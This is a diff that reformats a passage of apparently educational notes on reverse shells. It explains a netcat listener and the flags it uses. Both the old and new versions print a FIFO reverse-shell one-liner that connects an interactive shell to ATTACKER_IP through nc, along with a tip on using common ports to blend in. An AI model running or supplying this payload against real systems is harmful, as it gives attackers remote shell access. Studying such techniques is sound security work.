@@ -19,27 +19,25 @@ Once an attacker gets a shell, they can:
 
 **Listener setup (attacker):**
 
-    ```nc -lvnp 443
-    ```
-    
-    - `-l`: listen
-        
-    - `-v`: verbose
-        
-    - `-n`: no DNS
-        
-    - `-p`: port
-        
-    - Common ports (53, 80, 443, etc.) help blend with normal traffic.
-        
-- **Reverse shell payload (example – pipe/FIFO):**
-    
-    `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
-    
-    - Removes old pipe, creates FIFO.
-        
-    - Pipes input to an interactive shell.
-        
-    - Sends shell I/O over Netcat to attacker.
-        
-    - FIFO enables two-way communication.
+```
+  nc -lvnp 443
+``` 
+
+- `-l`: listen
+- `-v`: verbose
+- `-n`: no DNS
+- `-p`: port
+- Common ports (53, 80, 443, etc.) help blend with normal traffic.
+
+**Reverse shell payload (example – pipe/FIFO):**
+
+```
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+```
+
+- Removes old pipe, creates FIFO.
+- Pipes input to an interactive shell.
+- Sends shell I/O over Netcat to attacker.
+- FIFO enables two-way communication.
+
+---
